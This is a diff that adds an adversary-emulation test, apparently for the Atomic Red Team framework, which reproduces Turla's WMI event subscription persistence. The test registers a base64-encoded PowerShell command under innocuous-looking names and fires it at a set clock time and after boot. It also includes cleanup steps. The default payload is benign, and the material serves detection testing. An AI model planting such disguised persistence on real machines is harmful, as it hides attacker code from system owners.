@@ -127,3 +127,46 @@ atomic_tests:
       $EventConsumerToCleanup | Remove-WmiObject
       $EventFilterToCleanup | Remove-WmiObject
     name: powershell
+- name: Turla WMI Persistence - Dual Filter with Base64 Payload
+  auto_generated_guid: 67cee1c5-8c9b-460b-a4c3-76a6c69bcd15
+  description: |
+    Emulates WMI event subscription persistence used by Turla. Creates a single CommandLineEventConsumer
+    with a base64-encoded PowerShell payload, then binds it to two event filters: one that triggers at a
+    specific time of day (Win32_LocalTime) and one that triggers based on system uptime
+    (Win32_PerfFormattedData_PerfOS_System).
+
+    Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+  supported_platforms:
+  - windows
+  input_arguments:
+    benign_payload:
+      description: Benign PowerShell command to base64-encode and use as the payload
+      type: string
+      default: Get-Date
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('#{benign_payload}'))
+      $cmdLine = "$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $encodedPayload"
+
+      Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
+      $consumer = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate=$cmdLine;RunInteractively='false'}
+
+      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
+      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
+      $timeQuery = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40"
+      $timeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$timeQuery}
+      Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$timeFilter;Consumer=$consumer}
+
+      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
+      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
+      $uptimeQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400"
+      $uptimeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$uptimeQuery}
+      Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$uptimeFilter;Consumer=$consumer}
+    cleanup_command: |
+      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
+      Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
+      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
+      Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
+      Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
